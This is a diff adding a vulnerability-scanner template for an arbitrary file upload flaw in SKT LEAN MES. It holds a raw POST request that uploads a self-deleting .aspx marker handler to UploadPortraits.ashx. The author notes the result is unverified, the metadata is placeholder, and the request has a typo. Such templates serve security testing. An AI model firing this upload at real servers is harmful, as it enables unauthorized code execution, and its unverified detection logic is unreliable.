@@ -1,0 +1,42 @@
+id: skt-mes-UploadPortraits-fileupload
+info:
+  name: 深科特 LEAN MES 任意文件上传漏洞分析
+  author: leadlife
+  severity: critical
+  description: 
+  reference: 
+    - https://mp.weixin.qq.com/s/Pta7hBxwT6nUrNy3UO_LaA
+  classification:
+    cve-id: 
+  metadata:
+    verified: true/false
+    fofa-query: demo
+    hunter-query: demo
+    tips: 上传上去了默认为 1.aspx 但找不到上传到哪了，目前也无法验证了，先留着
+    repair:
+    version:
+  tags: fileupload,skt-mes
+
+variables:
+    filename: "{{to_lower(rand_base(4))}}"
+    date: '{{date_time("%Y%M%D%H%M%S")}}'
+
+http:
+  - raw:
+      - |
+        POST /Handler/UploadPortraits.ashx?Type=Upload&UserId=1&Filename=1.apsx HTTP/1.1
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+        Host: {{Hostname}}
+
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="Filedata"; filename="{{filename}}.aspx"
+
+        <%@ WebHandler Language="C#" Class="x"%>using System.Web;using System.IO;public class x:System.Web.IHttpHandler{public void ProcessRequest(HttpContext c){c.Response.Write("{{randstr}}");File.Delete(c.Request.PhysicalPath);}public bool IsReusable{get{return false;}}}
+        ------WebKitFormBoundary--
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body,'{{filename}}')
+        condition: and
